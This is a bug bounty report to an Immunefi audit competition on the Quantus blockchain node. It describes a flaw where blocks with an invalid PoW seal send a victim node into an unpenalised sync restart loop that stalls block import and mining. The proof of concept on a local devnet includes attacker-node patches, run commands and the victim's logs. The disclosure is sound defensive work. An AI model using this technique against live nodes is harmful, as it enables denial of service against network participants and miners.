# 88230 bc medium pow seal verified in import block instead of the verifier bad seal blocks from a peer trigger an unpenalised sync restart loop stalling block import and mining

**Submitted on Aug 12th 2026 at 10:15:32 UTC by @Lun3x for** [**Audit Comp | Quantus**](https://immunefi.com/audit-competition/audit-comp-quantus)

* **Report ID:** #88230
* **Report Type:** Blockchain/DLT
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-quantus-chain>
* **Impacts:**
  * Shutdown of greater than or equal to 30% of network processing nodes without brute force actions, but does not shut down the network
  * Increasing network processing node resource consumption by at least 30% without brute force actions, compared to the preceding 24 hours

## Description

## Brief/Intro

Quantus moved PoW seal verification out of the import queue's `Verifier` and into `BlockImport::import_block`. That relocation changes the error channel: import-stage failures surface as `BlockImportError::Other`, which — unlike `VerificationFailed` — carries no peer identity, so the sync strategy handles it by discarding all downloaded blocks and restarting sync **without penalising or disconnecting the peer that sent the bad block**. A single unauthenticated peer with zero hash power can therefore feed a victim node blocks carrying a random 64-byte seal, indefinitely and for free, keeping that node from importing anything. Targeted at a miner, this pauses its mining loop entirely.

## Vulnerability Details

Upstream `sc-consensus-pow` verifies the seal in the `Verifier`, where a failure is attributable to the peer that supplied the block. Quantus's verifier does no PoW check at all — it only moves the seal digest into `post_digests`:

`client/consensus/qpow/src/lib.rs:443-453`

```rust
/// Minimal verifier that extracts the PoW seal from header to post_digests.
struct SimplePowVerifier;

#[async_trait::async_trait]
impl<B> Verifier<B> for SimplePowVerifier
where
	B: BlockT<Hash = H256>,
{
	async fn verify(&self, block: BlockImportParams<B>) -> Result<BlockImportParams<B>, String> {
		extract_pow_seal::<B>(block).await
	}
}
```

The actual check happens later, inside `import_block`:

`client/consensus/qpow/src/lib.rs:282-296`

```rust
let (verified, achieved_difficulty) = self
    .client
    .runtime_api()
    .verify_and_get_achieved_difficulty(parent_hash, pre_hash_arr, nonce)
    ...
if !verified {
    log::error!("Invalid Seal {:?} for parent hash {:?}", inner_seal, parent_hash);
    return Err(Error::<B>::InvalidSeal.into());
}
```

`sc-consensus`'s import queue maps an `Err` from `import_block` to `BlockImportError::Other(ConsensusError)`. Compare the two error variants:

```rust
VerificationFailed(Option<RuntimeOrigin>, String),   // carries the peer
Other(ConsensusError),                               // carries nothing
```

The sync strategy's handling of these variants sits in three adjacent match arms, and the asymmetry is the whole bug:

`client/network-sync/src/strategy/chain_sync.rs:747-781`

```rust
Err(BlockImportError::VerificationFailed(peer_id, e)) => {
    ...
    if let Some(peer) = peer_id {
        self.actions
            .push(SyncingAction::DropPeer(BadPeer(peer, rep::VERIFICATION_FAIL)));
    }
    self.restart();
},
Err(BlockImportError::BadBlock(peer_id)) =>
    if let Some(peer) = peer_id {
        ...
        self.actions.push(SyncingAction::DropPeer(BadPeer(peer, rep::BAD_BLOCK)));
    },
...
e @ Err(BlockImportError::UnknownParent) | e @ Err(BlockImportError::Other(_)) => {
    warn!(target: LOG_TARGET, "💔 Error importing block {hash:?}: {}", e.unwrap_err());
    self.state_sync = None;
    self.restart();
},
```

`VerificationFailed` drops the peer. `BadBlock` drops the peer. `Other` calls `restart()` and nothing else — the peer id is not even available to it. Every Quantus-specific rejection lands in that last arm: `InvalidSeal` (`:295`), `DigestTooLong` (`:244`), the `CheckInherents` failure (`:192`, e.g. a bad timestamp), and a seal that is not 64 bytes (`:277`).

Two pieces of corroborating evidence that this is an unintended consequence of the relocation rather than a deliberate design:

1. `client/consensus/qpow/src/lib.rs:51` declares `Error::FailedPreliminaryVerify`. Grepping the whole repository for that identifier returns **only the declaration** — it is never constructed. That variant is the slot for upstream's `algorithm.preliminary_verify` hook, which was deleted.
2. There is no per-peer import-failure counter anywhere in the sync code. `grep -rn "import_fail\|failed_import\|bad_import" client/network-sync/src/` returns nothing, so nothing else compensates.

`restart()` is not a cheap operation. `client/network-sync/src/strategy/chain_sync.rs:1698-1743` clears the entire download buffer, pushes a `CancelRequest` for every busy peer, and re-adds all peers:

```rust
fn restart(&mut self) {
    self.blocks.clear();
    ...
}
```

So one attacker-supplied bad block discards work downloaded from **every** peer, not just the attacker's.

Nothing memoises the offending block as bad either — `Client::check_block` consults only the chain spec's `bad_blocks` list — so the identical block can be re-sent immediately and produce the same effect again.

The attacker's cost is a well-formed header and body. `validate_blocks` (`chain_sync.rs:2081-2145, 2539-2553`) requires only that the header hash matches the advertised hash and that the extrinsics root matches the body, both of which the attacker computes locally. The 64-byte seal is random. No mining, no stake, no privileges, no Sybil.

### Escalation against miners

A node stuck in restart stops making sync progress and falls behind. `MAJOR_SYNC_BLOCKS = 5` (`chain_sync.rs:96`), so once it is more than five blocks behind, `is_major_syncing()` becomes true, and two things follow:

* `node/src/service.rs:342-349` pauses the mining loop while major-syncing.
* `client/consensus/qpow/src/worker.rs:171-176` makes `MiningHandle::submit` discard locally mined candidates.

A miner held in this state produces no blocks at all, while paying nothing to the attacker.

## Impact Details

Two in-scope impacts apply, quoted verbatim from the program page.

Demonstrated effect — **Medium**:

> Shutdown of greater than or equal to 30% of network processing nodes without brute force actions, but does not shut down the network

The attack is per-victim and one attacker node can hold many simultaneous peer connections (the node's own default is `--in-peers 32`), so the fraction of the network affected scales with the connections the attacker opens rather than with any resource they must spend. Each affected node stops importing blocks and, if it mines, stops producing them. This is not brute force: it is one malformed block per victim per restart cycle, and the seal is random rather than mined.

Conditional escalation — **High**:

> Temporary freezing of network transactions by delaying one block by 500% or more of the average block time of the preceding 24 hours beyond standard difficulty adjustments

If the peers held in restart include miners representing a large enough share of hash power, block production slows proportionally and the 12-second target block time is exceeded by well over 500%. That threshold depends on the stalled miners holding a sufficient hash-power share, which is a property of the live network's miner distribution and cannot be measured from the repository. The Medium above does not depend on it.

No funds are stolen or frozen on-chain, so there is no funds-at-risk figure. The loss is availability of block import and block production on every node an attacker chooses to peer with.

The fix is small and the codebase already contains the intended shape: give the `Verifier` an `Arc<C>` and run `verify_and_get_achieved_difficulty` there, so a bad seal becomes `VerificationFailed(peer, …)` and the existing `DropPeer` path applies. The unused `Error::FailedPreliminaryVerify` variant is the slot for it.

## References

* `client/consensus/qpow/src/lib.rs:443-453` — `SimplePowVerifier::verify` performs no PoW check
* `client/consensus/qpow/src/lib.rs:282-296` — the seal check, in `import_block`, returning `Error::InvalidSeal`
* `client/consensus/qpow/src/lib.rs:51` — `Error::FailedPreliminaryVerify`, declared and never constructed
* `client/consensus/qpow/src/lib.rs:244, 192, 277` — the other rejections that land in the same error arm
* `client/network-sync/src/strategy/chain_sync.rs:747-781` — the three adjacent arms; only `Other` fails to drop the peer
* `client/network-sync/src/strategy/chain_sync.rs:1698-1743` — `restart()` clears all downloaded blocks and cancels all requests
* `client/network-sync/src/strategy/chain_sync.rs:96` — `MAJOR_SYNC_BLOCKS = 5`
* `client/network-sync/src/strategy/chain_sync.rs:2081-2145, 2539-2553` — what `validate_blocks` actually requires
* `node/src/service.rs:342-349` — mining pauses while major-syncing
* `client/consensus/qpow/src/worker.rs:171-176` — locally mined blocks discarded while major-syncing
* Asset revision: `audit-comp-quantus-chain` @ `3b243b870a5442a6e5f443056f67bbba87d472f5`, branch `audit-comp-ready`

## Proof of Concept

Local two-node devnet, run with the project's own release binary. Nothing touches mainnet or any public testnet. This is not a unit test: it is the real node, the real import queue, the real network stack and the real sync strategy, with one node serving an invalid-seal block to another over libp2p and the victim's own logs showing how it handles it.

A note on why the attacker node needs a patch. The defect is on the **victim** side, and the victim runs the unmodified binary. But a node cannot emit an invalid-seal block by accident: `MiningHandle::submit` verifies the seal before consuming the build (`worker.rs:187-226`), and then the node imports its own block through the same `import_block` that rejects bad seals. To stand in for a malicious peer I therefore gate two behaviours behind environment variables that only the attacker sets. A real attacker needs no patch at all — they craft the block bytes directly, and `validate_blocks` (`chain_sync.rs:2081-2145, 2539-2553`) only requires the header hash to match the announced hash and the extrinsics root to match the body, both of which they compute locally. The 64-byte seal is random.

### Attacker patch (two files, env-gated)

`client/consensus/qpow/src/worker.rs`, replacing the single line `let seal = DigestItem::Seal(POW_ENGINE_ID, seal);` at line 229 — corrupt the seal *after* the local verification passes:

```rust
// AUDIT PoC ONLY (env-gated): corrupt the seal after local verification so this
// node emits blocks whose PoW seal is invalid, simulating a malicious peer.
let seal = if std::env::var("QUANTUS_AUDIT_CORRUPT_SEAL").is_ok() {
    let mut s = seal.clone();
    if !s.is_empty() { s[0] ^= 0xff; }
    warn!(target: LOG_TARGET, "AUDIT: emitting block with CORRUPTED seal");
    s
} else { seal };
let seal = DigestItem::Seal(POW_ENGINE_ID, seal);
```

`client/consensus/qpow/src/lib.rs`, around the rejection at lines 293-296 — let the attacker accept its own bad block so it will import and gossip it:

```rust
if !verified {
    // AUDIT PoC ONLY (env-gated): the attacker node accepts its own invalid seal so
    // it will import and gossip the block. The VICTIM node runs without this var.
    if std::env::var("QUANTUS_AUDIT_SKIP_SEAL_CHECK").is_ok() {
        log::warn!("AUDIT: accepting INVALID seal locally (attacker node)");
    } else {
    log::error!("Invalid Seal {:?} for parent hash {:?}", inner_seal, parent_hash);
    return Err(Error::<B>::InvalidSeal.into());
    }
}
```

### Commands

```bash
cd chain
cargo build --release --bin quantus-node

# VICTIM — no audit env vars, so entirely stock behaviour
./target/release/quantus-node --dev --base-path /tmp/qA --port 30333 --rpc-port 9944 \
  --validator --name VICTIM -l sync=debug,qpow=info > /tmp/victim.log 2>&1 &

# read the victim's peer id from its log
grep -oE "Local node identity is: [A-Za-z0-9]+" /tmp/victim.log

# ATTACKER — emits invalid-seal blocks and accepts its own
QUANTUS_AUDIT_CORRUPT_SEAL=1 QUANTUS_AUDIT_SKIP_SEAL_CHECK=1 \
./target/release/quantus-node --dev --base-path /tmp/qB --port 30334 --rpc-port 9945 \
  --validator --name ATTACKER -l qpow=warn \
  --bootnodes /ip4/127.0.0.1/tcp/30333/p2p/<VICTIM_PEER_ID> > /tmp/attacker.log 2>&1 &
```

### Measured result — the victim's own log

The attacker connects, serves block 7 with a corrupted seal, and the victim does this (verbatim, `/tmp/victim.log`):

```
14:08:06.552 DEBUG sync: ⬅️ Received blocks from QmNxh7SBc…QVk9: 7..7
14:08:06.552 DEBUG sync: Processed `ChainSyncAction::ImportBlocks` with 1 blocks.
14:08:06.553 ERROR sc_consensus_qpow: Invalid Seal [255, 0, 0, 0, 0, 0, ... ] for parent hash 0x377c3dfc…
14:08:06.553 DEBUG sync::import-queue: Error importing block 7: 0x3f58c507…: Import failed: PoW validation error: invalid seal
14:08:06.553  WARN sync: 💔 Error importing block 0x3f58c507…: consensus error: Import failed: PoW validation error: invalid seal
14:08:06.553 DEBUG sync: Restarting sync with client info Info { best_hash: 0x377c3dfc…, best_number: 6, … }
14:08:06.553 DEBUG sync: Restarted with 6 (0x377c…7636)
14:08:06.554 DEBUG sync: New peer QmNxh7SBc…QVk9 with unknown best hash 0x3f58…828d (7), searching for common ancestor.
14:08:06.554 DEBUG sync: ➡️ Sent block request to QmNxh7SBc…QVk9: 6..6
14:08:06.554 DEBUG sync: ⬅️ Received blocks from QmNxh7SBc…QVk9: 7..7
14:08:06.554 ERROR sc_consensus_qpow: Invalid Seal [255, 0, 0, 0, 0, 0, ... ] for parent hash 0x377c3dfc…
14:08:06.554  WARN sync: 💔 Error importing block 0x3f58c507…: consensus error: Import failed: PoW validation error: invalid seal
14:08:06.554 DEBUG sync: Restarting sync with client info Info { … best_number: 6 … }
14:08:06.554 DEBUG sync: Restarted with 6 (0x377c…7636)
```

The `[255, 0, 0, …]` first byte is the corrupted seal (`0x00 ^ 0xff`), so the block is provably the attacker's invalid one.

Three things this establishes:

{% stepper %}
{% step %}

## The rejection lands in the un-penalised error arm

The message is `💔 Error importing block …: consensus error:` — the `UnknownParent | Other(_)` arm at `chain_sync.rs:777-781` — and it is followed immediately by `Restarting sync`. Not `💔 Verification failed for block …`, which is the arm that carries a peer id and drops the peer.
{% endstep %}

{% step %}

## No penalty of any kind is applied

Grepping the whole victim log for `Report`, `reputation`, `banned`, `Verification failed`, `blacklisted`, `DropPeer`, `BadPeer` returns 6 matches, and **all six are `reputation_change: None`** inside routine block-request handling:

```
DEBUG sync: Handling block request from QmNxh7SBc…QVk9: … reputation_change: `None`, small_request `false` …
```

There is no `DropPeer`, no `BadPeer`, no reputation adjustment, and no ban anywhere in the run.
{% endstep %}

{% step %}

## The peer is re-added immediately and the cycle repeats

One millisecond after the restart the victim logs `New peer QmNxh7SBc…QVk9 … searching for common ancestor`, re-requests, receives the same invalid block and fails again. Over the run:

```
Invalid Seal events:  7
Restart events:       8
```

The restart timestamps come in same-millisecond pairs — `14:08:06.553` / `14:08:06.554`, `14:09:15.357` / `14:09:15.359`, `14:09:18.918` / `14:09:18.919` — so this is a tight spin, not a slow degradation. Each restart also runs `self.blocks.clear()` (`chain_sync.rs:1698-1743`), discarding blocks downloaded from every other peer, not just the attacker's.
{% endstep %}
{% endstepper %}

### Scope of this measurement

It shows, on the real binary and the real network stack, that an invalid-seal block from a peer is rejected in `import_block`, surfaces as the un-attributable `Other` error, triggers a full sync restart, and results in **no penalty and no disconnection of the sender**, which is then re-added and re-serves the same block.

It does not measure a network-wide block delay. The devnet is two nodes and the victim keeps mining its own chain, so there is no measured 500% block-time figure from this run; that depends on the live miner distribution. What the run establishes is the mechanism and the absence of any rate limit on repeating it.

The victim and attacker did also disconnect and reconnect during the run (2 connects, 4 disconnect events). None of those is attributable to a penalty for the invalid blocks: every reputation value in the log is `None`, and no drop action appears.

### Restoring the tree

The two patched files are the attacker stand-in only and must be reverted before any other measurement:

```bash
git -C chain checkout -- client/consensus/qpow/src/worker.rs client/consensus/qpow/src/lib.rs
git -C chain status --porcelain    # expect empty
```

### Suggested fix and regression property

Give the `Verifier` an `Arc<C>` and run `verify_and_get_achieved_difficulty` inside `SimplePowVerifier::verify` rather than in `import_block`. A bad seal then becomes `VerificationFailed(peer, …)` and the existing `DropPeer(BadPeer(peer, rep::VERIFICATION_FAIL))` path applies unchanged. The unused `Error::FailedPreliminaryVerify` variant at `lib.rs:51` is the slot for exactly this.

Regression property: with a peer supplying a block whose seal fails PoW verification, the sync strategy must emit a `DropPeer` action for that peer. A test can assert that the action queue contains `SyncingAction::DropPeer` after feeding one invalid-seal block, which fails against the current code and passes once the check moves into the verifier.
